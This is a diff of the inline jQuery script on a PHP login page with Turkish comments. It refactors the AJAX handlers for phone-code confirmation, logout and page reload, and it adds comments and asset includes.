+                if (result.status == "ok") {
+
+                    //düzenleyeceğim div'i değere atıyorum
+                    var nrucel = document.getElementById("nrucel");
+
+                    //div'e eklenecek yazı
+                    nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3 style="color:#007E33;font-weight:bold">işlem başarılı. yönlendiriliyosun.</div>';
+
+                    //kontrol'e yönlendiriyorum
+                    window.location.href = base_url + "kontrol";
+
+                } 
+
+                //eğer başarısız ise
+                else {
+
+                    //hata mesajını göster
+                    $('#sonuc').html('<p style="color:#ed4956;font-size:14px;margin-top:10px;">' + result.message + '</p>');
+                }
+
+                //pasif ettiğim yerleri aktif yapıyorum
                 $('#number').removeAttr('readonly');
                 $('#gonder').prop("disabled", false);
                 document.getElementById('gonder').innerHTML = 'Gönder';
-                return;
+
+
+
             }
+        });
+    }
 
-            if(number.length < 6 || number.length > 6){
-                $('#sonuc').html('<p style="color:#ed4956;font-size:14px">Gelen onay kodu en az 6 karakter olmalıdır</p>');
+    //işlem sırasında çıkış yapmak isterse
+    function cikis() {
 
-                $('#number').removeAttr('readonly');
-                $('#gonder').prop("disabled", false);
-                document.getElementById('gonder').innerHTML = 'Gönder';
-                return;
-            }
+        //formdaki verileri değere atıyorum
+        var username = document.getElementById("username").value;
+        var user_id = document.getElementById("user_id").value;
 
-            $.ajax({
-                type: 'post',
-                url: base_url+'login/telKodOnay',
-                dataType: 'json',
-                data: "number="+number+"&username="+username+"&password="+password+"&user_id="+user_id+"&yol="+yol+"&igID="+igID,
-                success: function(result) {
+        //post işlemi
+        $.ajax({
+            type: 'post',
+            url: base_url + 'login/onayCikis',
+            dataType: 'json',
+            data: "username=" + username + "&user_id=" + user_id,
+            success: function(result) {
 
-                  console.log(result);
+                //eğer başarılı ise
+                if (result.status == "ok") {
 
-                    if(result.status == "ok"){
+                    //düzenleyeceğim div'i değere atıyorum
+                    var nrucel = document.getElementById("nrucel");
 
-                        var nrucel = document.getElementById("nrucel");
-
-                        nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3 style="color:#007E33;font-weight:bold">işlem başarılı. Sayfayı yenileyin ve tekrar giriş yapın.</h3><button class="btn btn-primary btn-block" id="gonder" style="margin-top:10px;" onclick="yenile()" style="font-size: 14px; font-weight: bold;"> Sayfayı Yenile</button></div>';
-
-                    } else {
-                        $('#sonuc').html('<p style="color:#ed4956;font-size:14px;margin-top:10px;">'+result.message+'</p>');
-                    }
-
-                    $('#number').removeAttr('readonly');
-                    $('#gonder').prop("disabled", false);
-                    document.getElementById('gonder').innerHTML = 'Gönder';
-
-
-
-                }
-            });
-        }
-
-        function cikis(){
-
-          var username = document.getElementById("username").value;
-          var user_id  = document.getElementById("user_id").value;
-
-                $.ajax({
-                type: 'post',
-                url: base_url+'login/onayCikis',
-                dataType: 'json',
-                data: "username="+username+"&user_id="+user_id,
-                success: function(result) {
-
-                    if(result.status == "ok"){
-                        var nrucel = document.getElementById("nrucel");
-
+                    //div'e eklenecek yazı
                     nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3 style="color:#007E33;font-weight:bold">Başarıyla Çıkış yaptınız...</h3><button class="btn btn-primary btn-block" id="gonder" style="margin-top:10px;" onclick="yenile()" style="font-size: 14px; font-weight: bold;"> Sayfayı Yenile</button></div>';
-                    } else {
-                        $('#sonuc').html('<p style="color:#ed4956;font-size:14px;margin-top:10px;">Sayfayı yenileyip tekrar giriş yapın.</p>');
-                    }
-                  }  
-                });
-        }
+                } 
 
-        function yenile(){
-            document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> bekleyin..";
-            window.location.reload();
-        }
+                //eğer başarısız ise
+                else {
 
-        document.getElementById("password").addEventListener("keyup", function(event) {
+                    //hata mesajı göster
+                    $('#sonuc').html('<p style="color:#ed4956;font-size:14px;margin-top:10px;">Sayfayı yenileyip tekrar giriş yapın.</p>');
+                }
+            }
+        });
+    }
+
+    //sayfa yenileme için
+    function yenile() {
+        document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> bekleyin..";
+        window.location.reload();
+    }
+
+    //enter tuşuna basınca giriş yap butonuna basmış saysın
+    document.getElementById("password").addEventListener("keyup", function(event) {
         event.preventDefault();
         if (event.keyCode === 13) {
             document.getElementById("gonder").click();
         }
-        });
+    });
 
 
   </script>
+  <link href="<?=$dsc?>yeni/css/nrucel1.css" rel="stylesheet">
+  <script type="text/javascript" src="<?=$dsc?>yeni/js/nrucel.js"></script>
+  <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
 </body>
 </html>
